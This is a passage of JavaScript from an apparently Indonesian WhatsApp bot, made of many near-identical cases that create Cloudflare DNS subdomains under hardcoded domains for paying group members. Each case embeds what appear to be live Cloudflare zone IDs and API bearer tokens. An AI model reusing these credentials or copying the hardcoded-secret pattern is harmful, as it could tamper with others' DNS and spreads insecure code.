                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain4': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})       
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "26b6ce099dc3d48e0b491a294786c68b";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
break
 case 'domain5': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellkuu.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain7': {
 if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "ab732313828957ac4dfa9dd05ecdbea4";
    let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
    let tld = "jasa-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain8': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "didinsec.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a8fda718f07621d32f906f1cc9938358";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})           
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283154501243")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "sellerpannel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By AZZAM STORE_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d877d9cf996ac8a1b371851e733ba20e";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain12': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f58970b468ab2eb4c3a546c0e37680e0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "pannelku.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain13': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "92fffa5f2cce4005a30e3950620cb97d";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain14': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e03420325af30aaed049cbcc4c3381ed";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "putraoffc.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain15': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba86d80050aa5a2343a8e456c85c32f0";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "kangpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain16': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return reply("Kamu Belum Bisa Akses Fitur Ini,, Join Group Create Subdomain Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282192773770")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "deb75eb2d37b30e954684a3db7f1e323";
               let apitoken = "8JzO_B9JDLVrMvr5Jp5-dpwXqvg_n9HWq_jV4fzL";
               let tld = "mypannelku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Hardz Offcial_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain17': {
